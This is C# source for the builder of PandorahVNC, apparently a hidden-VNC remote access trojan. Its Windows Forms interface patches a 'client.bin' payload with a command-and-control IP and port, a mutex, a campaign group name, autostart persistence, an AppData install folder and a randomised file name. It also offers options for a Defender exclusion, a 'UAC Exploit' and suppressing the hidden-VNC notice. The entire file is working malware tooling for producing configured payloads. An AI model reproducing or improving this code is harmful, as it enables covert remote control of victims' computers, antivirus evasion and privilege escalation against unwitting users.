using System;
using System.ComponentModel;
using System.Linq;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace ClientBuilder
{
    public class Builder : Form
    {
        private static readonly Random random = new Random();

        private IContainer components;

        private ComboBox comboWhere;

        private TextBox RandomFolder;

        private Label label5;

        private TextBox Mutex;

        private Label label4;

        private TextBox txtGroupName;

        private Label label3;

        private CheckBox checkAutostart;

        private CheckBox checkUAC;

        private CheckBox checkHVNC;

        private NumericUpDown txtPort;

        private Label label2;

        private TextBox txtIP;

        private Button btnBuild;

        private Label label1;

        private GroupBox groupBox1;

        private CheckBox wd;

        public ModuleDef Module { get; }

        public Builder()
        {
            InitializeComponent();
        }

        public static string RandomString(int length)
        {
            return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
                               select s[random.Next(s.Length)]).ToArray());
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                ModuleDefMD moduleDefMD = ModuleDefMD.Load("client.bin");
                foreach (TypeDef type in moduleDefMD.GetTypes())
                {
                    foreach (MethodDef method in type.Methods)
                    {
                        if (method.Name != "Main")
                        {
                            continue;
                        }
                        foreach (Instruction instruction in method.Body.Instructions)
                        {
                            if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "IP")
                            {
                                instruction.Operand = txtIP.Text;
                            }
                            else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "PORT")
                            {
                                instruction.Operand = txtPort.Text;
                            }
                            else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "identifier")
                            {
                                instruction.Operand = txtGroupName.Text;
                            }
                            else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "mutex")
                            {
                                instruction.Operand = Mutex.Text;
                            }
                            else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "install")
                            {
                                instruction.Operand = checkAutostart.Checked.ToString();
                            }
                            else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "path")
                            {
                                instruction.Operand = comboWhere.SelectedIndex.ToString();
                            }
                            else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "folder")
                            {
                                instruction.Operand = RandomFolder.Text;
                            }
                            else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "wdex")
                            {
                                instruction.Operand = wd.Checked.ToString();
                            }
                            else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "a2")
                            {
                                instruction.Operand = checkHVNC.Checked.ToString();
                            }
                            else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "kuKdBEFei.exe")
                            {
                                instruction.Operand = RandomString(6) + ".exe";
                            }
                        }
                    }
                }
                moduleDefMD.Write("client-build.exe");
                MessageBox.Show("done!");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            Mutex.Text = RandomString(6);
            txtGroupName.Text = RandomString(6);
            txtGroupName.Text = RandomString(6);
            RandomFolder.Text = RandomString(6);
            txtIP.Text = "127.0.0.1";
            txtPort.Text = "1338";
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            comboWhere = new System.Windows.Forms.ComboBox();
            RandomFolder = new System.Windows.Forms.TextBox();
            label5 = new System.Windows.Forms.Label();
            Mutex = new System.Windows.Forms.TextBox();
            label4 = new System.Windows.Forms.Label();
            txtGroupName = new System.Windows.Forms.TextBox();
            label3 = new System.Windows.Forms.Label();
            checkAutostart = new System.Windows.Forms.CheckBox();
            checkUAC = new System.Windows.Forms.CheckBox();
            checkHVNC = new System.Windows.Forms.CheckBox();
            txtPort = new System.Windows.Forms.NumericUpDown();
            label2 = new System.Windows.Forms.Label();
            txtIP = new System.Windows.Forms.TextBox();
            btnBuild = new System.Windows.Forms.Button();
            label1 = new System.Windows.Forms.Label();
            groupBox1 = new System.Windows.Forms.GroupBox();
            wd = new System.Windows.Forms.CheckBox();
            ((System.ComponentModel.ISupportInitialize)txtPort).BeginInit();
            groupBox1.SuspendLayout();
            SuspendLayout();
            comboWhere.FormattingEnabled = true;
            comboWhere.Items.AddRange(new object[3] { "%AppData%/Local", "%AppData%/Roaming", "%AppData%/Temp" });
            comboWhere.Location = new System.Drawing.Point(18, 118);
            comboWhere.Name = "comboWhere";
            comboWhere.Size = new System.Drawing.Size(248, 21);
            comboWhere.TabIndex = 32;
            RandomFolder.Location = new System.Drawing.Point(18, 236);
            RandomFolder.Name = "RandomFolder";
            RandomFolder.Size = new System.Drawing.Size(248, 20);
            RandomFolder.TabIndex = 30;
            label5.AutoSize = true;
            label5.Location = new System.Drawing.Point(15, 220);
            label5.Name = "label5";
            label5.Size = new System.Drawing.Size(85, 13);
            label5.TabIndex = 31;
            label5.Text = "Random Folder";
            Mutex.Location = new System.Drawing.Point(18, 197);
            Mutex.Name = "Mutex";
            Mutex.Size = new System.Drawing.Size(248, 20);
            Mutex.TabIndex = 28;
            label4.AutoSize = true;
            label4.Location = new System.Drawing.Point(15, 181);
            label4.Name = "label4";
            label4.Size = new System.Drawing.Size(85, 13);
            label4.TabIndex = 29;
            label4.Text = "Process Mutex";
            txtGroupName.Location = new System.Drawing.Point(18, 158);
            txtGroupName.Name = "txtGroupName";
            txtGroupName.Size = new System.Drawing.Size(248, 20);
            txtGroupName.TabIndex = 26;
            label3.AutoSize = true;
            label3.Location = new System.Drawing.Point(15, 142);
            label3.Name = "label3";
            label3.Size = new System.Drawing.Size(115, 13);
            label3.TabIndex = 27;
            label3.Text = "Country Group Name";
            checkAutostart.AutoSize = true;
            checkAutostart.Location = new System.Drawing.Point(18, 99);
            checkAutostart.Name = "checkAutostart";
            checkAutostart.Size = new System.Drawing.Size(98, 17);
            checkAutostart.TabIndex = 24;
            checkAutostart.Text = "Auto Startup";
            checkAutostart.UseVisualStyleBackColor = true;
            checkUAC.AutoSize = true;
            checkUAC.Location = new System.Drawing.Point(18, 262);
            checkUAC.Name = "checkUAC";
            checkUAC.Size = new System.Drawing.Size(92, 17);
            checkUAC.TabIndex = 23;
            checkUAC.Text = "UAC Exploit";
            checkUAC.UseVisualStyleBackColor = true;
            checkHVNC.AutoSize = true;
            checkHVNC.Location = new System.Drawing.Point(18, 308);
            checkHVNC.Name = "checkHVNC";
            checkHVNC.Size = new System.Drawing.Size(188, 17);
            checkHVNC.TabIndex = 21;
            checkHVNC.Text = "Disable Hidden hVNC message";
            checkHVNC.UseVisualStyleBackColor = true;
            txtPort.Location = new System.Drawing.Point(18, 73);
            txtPort.Maximum = new decimal(new int[4] { 65555, 0, 0, 0 });
            txtPort.Name = "txtPort";
            txtPort.Size = new System.Drawing.Size(248, 20);
            txtPort.TabIndex = 20;
            label2.AutoSize = true;
            label2.Location = new System.Drawing.Point(15, 54);
            label2.Name = "label2";
            label2.Size = new System.Drawing.Size(85, 13);
            label2.TabIndex = 19;
            label2.Text = "Port Listener";
            txtIP.Location = new System.Drawing.Point(18, 31);
            txtIP.Name = "txtIP";
            txtIP.Size = new System.Drawing.Size(248, 20);
            txtIP.TabIndex = 17;
            btnBuild.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            btnBuild.Location = new System.Drawing.Point(18, 331);
            btnBuild.Name = "btnBuild";
            btnBuild.Size = new System.Drawing.Size(248, 20);
            btnBuild.TabIndex = 16;
            btnBuild.Text = "Build";
            btnBuild.UseVisualStyleBackColor = true;
            btnBuild.Click += new System.EventHandler(btnBuild_Click);
            label1.AutoSize = true;
            label1.Location = new System.Drawing.Point(15, 15);
            label1.Name = "label1";
            label1.Size = new System.Drawing.Size(85, 13);
            label1.TabIndex = 18;
            label1.Text = "Host IP / DNS";
            groupBox1.Controls.Add(wd);
            groupBox1.Controls.Add(comboWhere);
            groupBox1.Controls.Add(RandomFolder);
            groupBox1.Controls.Add(label5);
            groupBox1.Controls.Add(Mutex);
            groupBox1.Controls.Add(label4);
            groupBox1.Controls.Add(txtGroupName);
            groupBox1.Controls.Add(label3);
            groupBox1.Controls.Add(checkAutostart);
            groupBox1.Controls.Add(checkUAC);
            groupBox1.Controls.Add(checkHVNC);
            groupBox1.Controls.Add(txtPort);
            groupBox1.Controls.Add(label2);
            groupBox1.Controls.Add(txtIP);
            groupBox1.Controls.Add(btnBuild);
            groupBox1.Controls.Add(label1);
            groupBox1.Dock = System.Windows.Forms.DockStyle.Fill;
            groupBox1.Location = new System.Drawing.Point(0, 0);
            groupBox1.Margin = new System.Windows.Forms.Padding(0);
            groupBox1.Name = "groupBox1";
            groupBox1.Padding = new System.Windows.Forms.Padding(0);
            groupBox1.Size = new System.Drawing.Size(280, 362);
            groupBox1.TabIndex = 5;
            groupBox1.TabStop = false;
            wd.AutoSize = true;
            wd.Location = new System.Drawing.Point(18, 285);
            wd.Name = "wd";
            wd.Size = new System.Drawing.Size(134, 17);
            wd.TabIndex = 33;
            wd.Text = "Defender Exclusion";
            wd.UseVisualStyleBackColor = true;
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            base.ClientSize = new System.Drawing.Size(280, 362);
            base.Controls.Add(groupBox1);
            Font = new System.Drawing.Font("Consolas", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 238);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
            base.MaximizeBox = false;
            MaximumSize = new System.Drawing.Size(300, 405);
            base.MinimizeBox = false;
            MinimumSize = new System.Drawing.Size(300, 405);
            base.Name = "Builder";
            base.ShowIcon = false;
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            Text = "PandorahVNC - Builder | Snyke";
            base.TopMost = true;
            base.Load += new System.EventHandler(Builder_Load);
            ((System.ComponentModel.ISupportInitialize)txtPort).EndInit();
            groupBox1.ResumeLayout(false);
            groupBox1.PerformLayout();
            ResumeLayout(false);
        }
    }
}